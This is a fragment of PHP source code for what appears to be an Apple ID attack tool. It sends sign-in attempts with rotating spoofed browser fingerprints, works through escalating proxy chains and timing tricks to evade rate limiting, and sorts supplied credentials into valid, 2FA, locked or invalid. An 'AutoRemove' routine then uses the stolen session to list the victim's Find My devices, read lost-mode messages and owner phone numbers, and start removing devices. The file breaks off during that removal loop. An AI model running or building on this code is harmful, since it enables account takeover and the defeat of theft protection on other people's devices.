// BROWSER FINGERPRINTS
// ============================================================================
$BROWSER_PROFILES = [
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'platform' => 'MacIntel', 'vendor' => 'Google Inc.', 'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00', 'sec_ch_ua' => '"Chromium";v="122", "Google Chrome";v="122"'],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'en-US', 'tz' => 'America/Chicago', 'tz_offset' => 'GMT-06:00', 'sec_ch_ua' => '"Chromium";v="122", "Google Chrome";v="122"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15', 'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.', 'lang' => 'en-US', 'tz' => 'America/Los_Angeles', 'tz_offset' => 'GMT-08:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0', 'platform' => 'Win32', 'vendor' => '', 'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'platform' => 'Linux x86_64', 'vendor' => 'Google Inc.', 'lang' => 'en-US', 'tz' => 'America/Denver', 'tz_offset' => 'GMT-07:00', 'sec_ch_ua' => '"Chromium";v="121", "Google Chrome";v="121"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.', 'lang' => 'en-GB', 'tz' => 'Europe/London', 'tz_offset' => 'GMT+00:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36 Edg/121.0.0.0', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'en-US', 'tz' => 'America/New_York', 'tz_offset' => 'GMT-05:00', 'sec_ch_ua' => '"Microsoft Edge";v="121", "Chromium";v="121"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0', 'platform' => 'MacIntel', 'vendor' => '', 'lang' => 'es-ES', 'tz' => 'Europe/Madrid', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'en-CA', 'tz' => 'America/Toronto', 'tz_offset' => 'GMT-05:00', 'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'platform' => 'MacIntel', 'vendor' => 'Google Inc.', 'lang' => 'en-AU', 'tz' => 'Australia/Sydney', 'tz_offset' => 'GMT+11:00', 'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123"'],
    ['ua' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'platform' => 'Linux x86_64', 'vendor' => '', 'lang' => 'de-DE', 'tz' => 'Europe/Berlin', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'pt-BR', 'tz' => 'America/Sao_Paulo', 'tz_offset' => 'GMT-03:00', 'sec_ch_ua' => '"Opera";v="108", "Chromium";v="122"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'platform' => 'MacIntel', 'vendor' => 'Google Inc.', 'lang' => 'fr-FR', 'tz' => 'Europe/Paris', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => '"Chromium";v="120", "Google Chrome";v="120"'],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'ja-JP', 'tz' => 'Asia/Tokyo', 'tz_offset' => 'GMT+09:00', 'sec_ch_ua' => '"Microsoft Edge";v="120", "Chromium";v="120"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15', 'platform' => 'MacIntel', 'vendor' => 'Apple Computer, Inc.', 'lang' => 'ko-KR', 'tz' => 'Asia/Seoul', 'tz_offset' => 'GMT+09:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'platform' => 'Win32', 'vendor' => '', 'lang' => 'it-IT', 'tz' => 'Europe/Rome', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => null],
    ['ua' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'platform' => 'Linux x86_64', 'vendor' => 'Google Inc.', 'lang' => 'nl-NL', 'tz' => 'Europe/Amsterdam', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => '"Chromium";v="123", "Google Chrome";v="123"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'platform' => 'MacIntel', 'vendor' => 'Google Inc.', 'lang' => 'zh-CN', 'tz' => 'Asia/Shanghai', 'tz_offset' => 'GMT+08:00', 'sec_ch_ua' => '"Chromium";v="121", "Google Chrome";v="121"'],
    ['ua' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'platform' => 'Win32', 'vendor' => 'Google Inc.', 'lang' => 'ru-RU', 'tz' => 'Europe/Moscow', 'tz_offset' => 'GMT+03:00', 'sec_ch_ua' => '"Chromium";v="124", "Google Chrome";v="124"'],
    ['ua' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0', 'platform' => 'MacIntel', 'vendor' => '', 'lang' => 'sv-SE', 'tz' => 'Europe/Stockholm', 'tz_offset' => 'GMT+01:00', 'sec_ch_ua' => null],
];
$_used_profiles = [];

function generate_fingerprint(bool $is_unblocker = false): array
{
    global $BROWSER_PROFILES, $_used_profiles;
    $recent = array_slice($_used_profiles, -3);
    $available = array_filter($BROWSER_PROFILES, fn($p) => !in_array($p, $recent, true));
    if (empty($available)) {
        $available = $BROWSER_PROFILES;
        $_used_profiles = [];
    }
    $profile = $available[array_rand($available)];
    $_used_profiles[] = $profile;

    $client_id = 'auth-' . strtolower(uniqid('', true));
    $session_uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));

    $fd_info = json_encode([
        'U' => $profile['ua'], 'L' => $profile['lang'],
        'Z' => $profile['tz_offset'], 'V' => '1.1',
        'F' => 'VGF0YXJ7' . base64_encode(substr($session_uuid, 0, 8)),
    ], JSON_UNESCAPED_SLASHES);

    $headers = [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: ' . $profile['lang'] . ',en;q=0.9',
        'Accept-Encoding: gzip, deflate, br',
        'Content-Type: application/json',
        'Origin: https://idmsa.apple.com',
        'Referer: https://idmsa.apple.com/',
        'User-Agent: ' . $profile['ua'],
        'X-Apple-Widget-Key: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
        'X-Apple-OAuth-Client-Id: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
        'X-Apple-OAuth-Client-Type: firstPartyAuth',
        'X-Apple-OAuth-Redirect-URI: https://www.icloud.com',
        'X-Apple-OAuth-Require-Grant-Code: true',
        'X-Apple-OAuth-Response-Mode: web_message',
        'X-Apple-OAuth-Response-Type: code',
        'X-Apple-OAuth-State: ' . $client_id,
        'X-Apple-I-FD-Client-Info: ' . $fd_info,
        'X-Apple-I-TimeZone: ' . $profile['tz'],
        'X-Requested-With: XMLHttpRequest',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
    ];
    if ($profile['sec_ch_ua']) {
        $headers[] = 'Sec-CH-UA: ' . $profile['sec_ch_ua'];
        $headers[] = 'Sec-Fetch-Dest: empty';
        $headers[] = 'Sec-Fetch-Mode: cors';
        $headers[] = 'Sec-Fetch-Site: same-origin';
    }
    if ($is_unblocker) {
        $headers[] = 'X-SU-Force-Headers: 1';
        $headers[] = 'X-SU-Force-Cookies: 1';
        $headers[] = 'X-SU-Session-Id: ' . $session_uuid;
    }
    return [$headers, $profile];
}

// ============================================================================
// CURL HELPER
// ============================================================================
function curl_request(string $method, string $url, ?string $body = null, array $headers = [], ?string $proxy = null, int $timeout = 30): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_ENCODING => '',
        CURLOPT_FOLLOWLOCATION => false,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null)
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    }
    $response = curl_exec($ch);
    $err = curl_error($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);

    if ($response === false) {
        return ['status' => 0, 'headers' => [], 'body' => '', 'error' => $err];
    }
    $raw_headers = substr($response, 0, $header_size);
    $body_str = substr($response, $header_size);

    // Parse response headers
    $resp_headers = [];
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (strpos($line, ':') !== false) {
            [$key, $val] = explode(':', $line, 2);
            $resp_headers[trim($key)] = trim($val);
        }
    }
    return ['status' => $http_code, 'headers' => $resp_headers, 'body' => $body_str, 'error' => null];
}

function extract_tokens(array $resp_headers): array
{
    global $TOKEN_HEADERS;
    $tokens = [];
    foreach ($TOKEN_HEADERS as $header => $name) {
        // Case-insensitive header lookup
        foreach ($resp_headers as $k => $v) {
            if (strcasecmp($k, $header) === 0) {
                $tokens[$name] = $v;
            }
        }
    }
    return $tokens;
}

// ============================================================================
// AUTHENTICATION (SRP init → complete) with cookie session
// ============================================================================

/** cURL request with cookie jar (emulates Python requests.Session) */
function curl_session_request(string $method, string $url, ?string $body, array $headers, ?string $proxy, int $timeout, string $cookie_jar): array
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_ENCODING => '',
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_COOKIEJAR => $cookie_jar,
        CURLOPT_COOKIEFILE => $cookie_jar,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($body !== null)
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    if ($proxy)
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    $response = curl_exec($ch);
    $err = curl_error($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    if ($response === false)
        return ['status' => 0, 'headers' => [], 'body' => '', 'error' => $err];
    $raw_headers = substr($response, 0, $header_size);
    $body_str = substr($response, $header_size);
    $resp_headers = [];
    foreach (explode("\r\n", $raw_headers) as $line) {
        if (strpos($line, ':') !== false) {
            [$key, $val] = explode(':', $line, 2);
            $resp_headers[trim($key)] = trim($val);
        }
    }
    return ['status' => $http_code, 'headers' => $resp_headers, 'body' => $body_str, 'error' => null];
}

function auth_attempt(string $apple_id, string $password, array $cfg, ?string $proxy = null): array
{
    $result = ['success' => false, 'status' => 'failed', 'status_code' => null, 'tokens' => [], 'error_message' => null];

    [$headers, $profile] = generate_fingerprint();
    $proxy_name = $proxy ? 'PROXY' : 'DIRECT';
    emit_log('debug', "  → {$proxy_name} | " . substr($profile['ua'], 0, 45) . '...');

    try {
        // SRP setup
        $srp_pw = new SrpPassword($password);
        $srp_client = new SrpClient($apple_id, $srp_pw);
        $A_bytes = $srp_client->startAuthentication();

        // === INIT ===
        $init_url = AUTH_ENDPOINT . '/signin/init';
        $init_data = json_encode([
            'a' => base64_encode($A_bytes),
            'accountName' => $apple_id,
            'protocols' => ['s2k', 's2k_fo'],
        ]);

        // Use cookie-jar session (like Python requests.Session)
        $cookie_jar = tempnam(sys_get_temp_dir(), 'srp_');
        $resp = curl_session_request('POST', $init_url, $init_data, $headers, $proxy, 30, $cookie_jar);
        emit_log('debug', "  ← init HTTP {$resp['status']}");

        $session_data = extract_tokens($resp['headers']);

        if ($resp['status'] === 503) {
            $result['status_code'] = 503;
            $result['error_message'] = '503 at init';
            return $result;
        }
        if ($resp['status'] !== 200) {
            $result['status_code'] = $resp['status'];
            $result['error_message'] = "init {$resp['status']}";
            return $result;
        }

        $init = json_decode($resp['body'], true);
        if (!$init || !isset($init['salt'], $init['b'], $init['c'], $init['iteration'], $init['protocol'])) {
            $result['error_message'] = 'Invalid init response';
            return $result;
        }

        $salt = base64_decode($init['salt']);
        $B_raw = base64_decode($init['b']);
        $c = $init['c'];
        $iterations = (int)$init['iteration'];
        $protocol = $init['protocol'];

        emit_log('debug', "  ← protocol={$protocol} iter={$iterations} salt_len=" . strlen($salt) . " B_len=" . strlen($B_raw));

        // Human delay
        if ($cfg['human_delay'] ?? true) {
            $delay = max(0.5, min(2.5, 1.2 + (mt_rand(-30, 30) / 100)));
            usleep((int)($delay * 1000000));
        }

        // === COMPLETE ===
        $srp_pw->setEncryptInfo($salt, $iterations, 32, $protocol);
        $M1 = $srp_client->processChallenge($salt, $B_raw);

        $complete_url = AUTH_ENDPOINT . '/signin/complete?isRememberMeEnabled=true';

        // Add session headers
        if (isset($session_data['session_id'])) {
            $headers[] = 'X-Apple-ID-Session-Id: ' . $session_data['session_id'];
        }
        if (isset($session_data['scnt'])) {
            $headers[] = 'scnt: ' . $session_data['scnt'];
        }

        $complete_data = json_encode([
            'accountName' => $apple_id,
            'c' => $c,
            'm1' => base64_encode($M1),
            'm2' => base64_encode($srp_client->H_AMK),
            'rememberMe' => true,
            'trustTokens' => [],
        ]);

        emit_log('debug', '  → M1: ' . substr(base64_encode($M1), 0, 30) . '...');

        $resp = curl_session_request('POST', $complete_url, $complete_data, $headers, $proxy, 30, $cookie_jar);
        emit_log('debug', "  ← complete HTTP {$resp['status']}");

        $complete_tokens = extract_tokens($resp['headers']);
        $session_data = array_merge($session_data, $complete_tokens);
        $result['status_code'] = $resp['status'];
        $result['tokens'] = $session_data;

        if ($resp['status'] === 503) {
            $result['error_message'] = '503 at complete';
            return $result;
        }

        switch ($resp['status']) {
            case 200:
                $result['success'] = true;
                $result['status'] = 'success';
                break;
            case 409:
                $result['success'] = true;
                $result['status'] = '2fa_required';
                break;
            case 401:
                $result['error_message'] = 'Invalid credentials';
                break;
            case 403:
                $result['error_message'] = 'Account locked';
                break;
            default:
                $result['error_message'] = "Unknown: {$resp['status']}";
                break;
        }
        @unlink($cookie_jar);
        return $result;

    }
    catch (\Throwable $e) {
        $result['error_message'] = get_class($e) . ': ' . substr($e->getMessage(), 0, 80);
        @unlink($cookie_jar);
        return $result;
    }
}

// ============================================================================
// PROXY MANAGER
// ============================================================================
function get_proxy_url(string $mode, array $cfg): ?string
{
    static $current_port_idx = 0;
    if ($mode === 'direct' || $mode === 'direct_aggressive')
        return null;
    if ($mode === 'free_proxy') {
        return free_proxy_next();
    }
    if ($mode === 'gitproxy') {
        return gitproxy_next();
    }
    if (($mode === 'unblocker') && ($cfg['unblocker_user'] ?? '')) {
        return "https://{$cfg['unblocker_user']}:{$cfg['unblocker_pass']}@{$cfg['unblocker_host']}:{$cfg['unblocker_port']}";
    }
    if (($mode === 'residential' || $mode === 'proxy') && ($cfg['proxy_user'] ?? '')) {
        $start = (int)$cfg['proxy_port_start'];
        $end = (int)$cfg['proxy_port_end'];
        $port = $start + ($current_port_idx % ($end - $start + 1));
        $current_port_idx++;
        return "http://{$cfg['proxy_user']}:{$cfg['proxy_pass']}@{$cfg['proxy_host']}:{$port}";
    }
    return null;
}

// ============================================================================
// ESCALATION ENGINE (Smart multi-strategy auth)
// ============================================================================
function build_escalation_chain(array $cfg): array
{
    global $last_success_mode;
    $mode = $cfg['mode'];
    $has_res = !empty($cfg['proxy_user']);
    $has_unb = !empty($cfg['unblocker_user']);
    $all_modes = [];

    if ($mode === 'smart') {
        $all_modes = ['direct'];
        if ($has_res)
            $all_modes[] = 'residential';
        if ($has_unb)
            $all_modes[] = 'unblocker';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'direct') {
        $all_modes = ['direct'];
        if ($has_res)
            $all_modes[] = 'residential';
        if ($has_unb)
            $all_modes[] = 'unblocker';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
    }
    elseif ($mode === 'gitproxy') {
        $all_modes = ['gitproxy'];
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'free_proxy') {
        $all_modes = ['free_proxy'];
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'proxy' || $mode === 'residential') {
        $all_modes = ['residential'];
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    elseif ($mode === 'unblocker') {
        $all_modes = ['unblocker'];
        if ($has_res)
            $all_modes[] = 'residential';
        $all_modes[] = 'gitproxy';
        $all_modes[] = 'free_proxy';
        $all_modes[] = 'direct_aggressive';
    }
    else {
        $all_modes = [$mode, 'gitproxy', 'free_proxy', 'direct_aggressive'];
    }

    // Smart reorder: if last_ok mode is in pool, move to front
    if ($last_success_mode && in_array($last_success_mode, $all_modes) && $all_modes[0] !== $last_success_mode) {
        $all_modes = array_values(array_diff($all_modes, [$last_success_mode]));
        array_unshift($all_modes, $last_success_mode);
        emit_log('debug', "  ♻️ Chain reordered: " . strtoupper($last_success_mode) . " succeeded last → goes first");
    }

    $labels = ['direct' => 'DIRECT', 'residential' => 'RESIDENTIAL', 'unblocker' => 'UNBLOCKER', 'free_proxy' => 'FREE-PROXY', 'gitproxy' => 'GIT-PROXY', 'direct_aggressive' => 'DIRECT-AGG'];
    $retries_map = ['direct' => 2, 'residential' => 2, 'unblocker' => 2, 'gitproxy' => 3, 'free_proxy' => 3, 'direct_aggressive' => 1];
    $chain = [];
    $cumulative_503 = 0;
    foreach ($all_modes as $i => $m) {
        $label = $labels[$m] ?? strtoupper($m);
        if ($i > 0)
            $label .= '↑';
        $chain[] = ['mode' => $m, 'label' => $label, 'retries' => $retries_map[$m] ?? 1, 'trigger_after_503' => $cumulative_503];
        $cumulative_503 += $retries_map[$m] ?? 1;
    }
    return $chain;
}

function authenticate(string $apple_id, string $password, array $cfg): array
{
    global $STATS, $last_success_mode;
    $consecutive_fails = 0;
    $result = null;
    $used_method = 'direct'; // track which method was actually used
    $escalation = build_escalation_chain($cfg);
    $chain_labels = array_map(fn($e) => $e['label'], $escalation);
    emit_log('debug', '  🔗 Chain: ' . implode(' → ', $chain_labels));

    foreach ($escalation as $step) {
        if ($consecutive_fails < $step['trigger_after_503'])
            continue;

        for ($attempt = 0; $attempt < $step['retries']; $attempt++) {
            // Progressive delay
            if ($consecutive_fails > 0) {
                $base_delay = min(10, 2.0 * pow(1.5, $consecutive_fails));
                $jitter = mt_rand(50, 200) / 100;
                $wait = $base_delay + $jitter;
                $wait_str = number_format($wait, 1);
                emit_log('warning', "  ⏳ Fail #{$consecutive_fails} — waiting {$wait_str}s before {$step['label']}");
                usleep((int)($wait * 1000000));
            }

            $proxy = get_proxy_url($step['mode'], $cfg);

            // Determine the connection method label
            $mode = $step['mode'];
            if ($mode === 'unblocker') {
                $used_method = 'site_unblocker';
            }
            elseif ($mode === 'residential' || $mode === 'proxy') {
                $used_method = 'proxy';
            }
            elseif ($mode === 'free_proxy') {
                $used_method = 'free_proxy';
            }
            elseif ($mode === 'gitproxy') {
                $used_method = 'gitproxy';
            }
            else {
                $used_method = 'direct';
            }

            $result = auth_attempt($apple_id, $password, $cfg, $proxy);
            $sc = $result['status_code'];

            if ($sc === 503 || $sc === null || $sc === 0) {
                $consecutive_fails++;
                if ($sc === 503) {
                    $STATS['errors_503']++;
                    emit_log('warning', "  🔴 503 #{$consecutive_fails} via {$step['label']}");
                }
                else {
                    $msg = substr($result['error_message'] ?? '', 0, 60);
                    emit_log('warning', "  🔴 Connection fail #{$consecutive_fails} via {$step['label']}: {$msg}");
                }
                continue;
            }

            // Definitive result
            if ($sc === 200 || $sc === 409) {
                $last_success_mode = $step['mode'];
            }
            $result['connection_method'] = $used_method;
            return $result;
        }
    }

    if ($result) {
        emit_log('error', "  💀 All attempts failed ({$consecutive_fails} failures)");
    }
    $final = $result ?? ['success' => false, 'status' => 'failed', 'status_code' => null, 'tokens' => [], 'error_message' => "All {$consecutive_fails} attempts failed"];
    $final['connection_method'] = $used_method;
    return $final;
}

// ============================================================================
// AUTO REMOVE — Native PHP (exact port of Python AppleDeviceRemover)
// ============================================================================
$ICLOUD_LOGIN_HEADERS = [
    'Host: setup.icloud.com',
    'Connection: keep-alive',
    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua-mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Content-Type: text/plain;charset=UTF-8',
    'Accept: */*',
    'Origin: https://www.icloud.com',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://www.icloud.com/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
];

function fmip_headers(string $cookies, string $content_type = 'application/json'): array
{
    return [
        'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding: gzip, deflate, br',
        "Content-Type: {$content_type}",
        'Origin: https://www.icloud.com',
        'Connection: keep-alive',
        'Referer: https://www.icloud.com/',
        "Cookie: {$cookies}",
    ];
}

function extract_set_cookies(array $resp_headers): string
{
    $parts = [];
    foreach ($resp_headers as $k => $v) {
        if (strcasecmp($k, 'Set-Cookie') === 0) {
            foreach (explode(',', $v) as $segment) {
                $segment = trim($segment);
                if (strpos($segment, '=') !== false) {
                    $cookie_part = trim(explode(';', $segment)[0]);
                    if ($cookie_part && !in_array($cookie_part, $parts)) {
                        $parts[] = $cookie_part;
                    }
                }
            }
        }
    }
    return implode('; ', $parts);
}

function autoremove_execute(string $apple_id, string $password, string $session_token, array $cfg): array
{
    global $STATS, $ICLOUD_LOGIN_HEADERS;
    $removal_id = substr(uniqid(), -8);
    $removal = ['id' => $removal_id, 'email' => $apple_id, 'time' => date('H:i:s'), 'status' => 'processing',
        'owner' => '', 'devices' => [], 'devices_count' => 0, 'removed_count' => 0, 'failed_count' => 0, 'error' => null];

    emit_log('removal', "🔄 AutoRemove → {$apple_id}");
    emit_log('debug', '  🔑 Token: ' . substr($session_token, 0, 30) . '...');

    // Shared cookie jar for entire remove flow (like Python requests.Session)
    $cookie_jar = tempnam(sys_get_temp_dir(), 'remove_');

    // Step 1: iCloud Login
    emit_log('removal', '  📡 Step 1: iCloud Login (setup.icloud.com)');
    $uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));
    $login_url = ICLOUD_SETUP_URL . "?clientBuildNumber=2419Project41&clientMasteringNumber=2419B20&clientId={$uuid}";
    $login_payload = json_encode(['dsWebAuthToken' => $session_token, 'extended_login' => false]);

    $resp = curl_session_request('POST', $login_url, $login_payload, $ICLOUD_LOGIN_HEADERS, null, 20, $cookie_jar);
    emit_log('debug', "  ← Login HTTP {$resp['status']}");

    if ($resp['status'] !== 200) {
        $removal['status'] = 'failed';
        $removal['error'] = "iCloud login HTTP {$resp['status']}";
        emit_log('error', "  ✗ iCloud login HTTP {$resp['status']}");
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    $login_result = json_decode($resp['body'], true);
    if (!$login_result || isset($login_result['error'])) {
        $removal['status'] = 'failed';
        $removal['error'] = 'iCloud login error';
        emit_log('error', '  ✗ iCloud login error');
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    $server = $login_result['webservices']['findme']['url'] ?? '';

    if (!$server) {
        $removal['status'] = 'failed';
        $removal['error'] = 'No findme server in response';
        emit_log('error', '  ✗ No findme server URL in response');
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }
    emit_log('debug', "  ✓ FindMe: {$server}");

    // Step 2: Refresh Client
    emit_log('removal', '  📡 Step 2: Refresh client (device list)');
    $refresh_url = "{$server}/fmipservice/client/web/refreshClient";
    $refresh_payload = json_encode([
        'clientContext' => [
            'appName' => 'iCloud Find (Web)', 'appVersion' => '2.0', 'apiVersion' => '3.0',
            'deviceListVersion' => 1, 'fmly' => true, 'timezone' => 'US/Pacific', 'inactiveTime' => 315,
        ]
    ]);

    // All requests use the shared cookie jar — cookies from login are auto-sent
    $resp = curl_session_request('POST', $refresh_url, $refresh_payload, fmip_headers('', 'text/plain'), null, 20, $cookie_jar);
    emit_log('debug', "  ← refreshClient HTTP {$resp['status']}");

    if ($resp['status'] !== 200) {
        $removal['status'] = 'failed';
        $removal['error'] = "refreshClient HTTP {$resp['status']}";
        emit_log('error', "  ✗ refreshClient HTTP {$resp['status']}");
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    // Cookies auto-managed by cookie jar — no manual accumulation needed

    $client_data = json_decode($resp['body'], true);
    $content = $client_data['content'] ?? [];
    $user_info = $client_data['userInfo'] ?? [];
    $owner = trim(($user_info['firstName'] ?? '') . ' ' . ($user_info['lastName'] ?? '')) ?: $apple_id;
    emit_log('debug', "  ✓ Devices: " . count($content) . " | User: {$owner}");

    // Step 3: Process each device
    $devices = [];
    $removed_count = 0;

    foreach ($content as $idx => $device) {
        $name = $device['name'] ?? 'Unknown';
        $model = $device['deviceDisplayName'] ?? 'Unknown';
        $device_id = $device['id'] ?? '';
        $bat_raw = $device['batteryLevel'] ?? 0;
        $battery = ($bat_raw > 0) ? round($bat_raw * 100, 2) : 0;
        $lost_enabled = $device['lostModeEnabled'] ?? false;
        $lost_dev = $device['lostDevice'] ?? [];
        $lost_message = is_array($lost_dev) ? ($lost_dev['text'] ?? '') : '';
        $lost_phone = is_array($lost_dev) ? ($lost_dev['ownerNbr'] ?? '') : '';

        $num = $idx + 1;
        $total = count($content);
        emit_log('removal', "  📱 [{$num}/{$total}] {$model} ({$name})");

        // 3a: authForUserDevice
        $auth_url = "{$server}/fmipservice/client/web/authForUserDevice";
        $auth_payload = json_encode(['device' => $device_id, 'authToken' => $password]);
        $resp = curl_session_request('POST', $auth_url, $auth_payload, fmip_headers(''), null, 15, $cookie_jar);
